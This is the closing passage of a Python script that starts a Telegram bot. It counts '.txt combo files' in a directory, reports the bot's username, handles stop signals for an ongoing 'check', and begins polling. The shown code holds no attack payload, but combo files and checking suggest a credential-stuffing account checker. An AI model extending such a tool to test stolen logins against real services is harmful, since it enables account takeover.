    combo_files = list(Path(COMBO_DIR).glob("**/*.txt"))
    console.print(f"  [bright_cyan]⬡[/bright_cyan]  [dim]{len(combo_files)} combo file(s)[/dim]")

    try:
        me = bot.get_me()
        BOT_USERNAME = me.username or ""
        console.print(f"  [bright_green]✔[/bright_green]  [dim]Bot: @{BOT_USERNAME}[/dim]")
    except Exception as e:
        console.print(f"  [yellow]⚠[/yellow]  [dim]Could not fetch bot info: {e}[/dim]")

    console.print()
    console.print("  [bold bright_green]🤖 Bot running — send /start in Telegram[/bold bright_green]\n")

    def _sig(sig, frame):
        if STATE.is_checking:
            STATE.stop()
        console.print("\n  [dim]Stopped.[/dim]")
        sys.exit(0)

    signal.signal(signal.SIGTERM, _sig)
    signal.signal(signal.SIGINT, _sig)

    bot.infinity_polling(timeout=30, long_polling_timeout=25)

if __name__ == "__main__":
    main()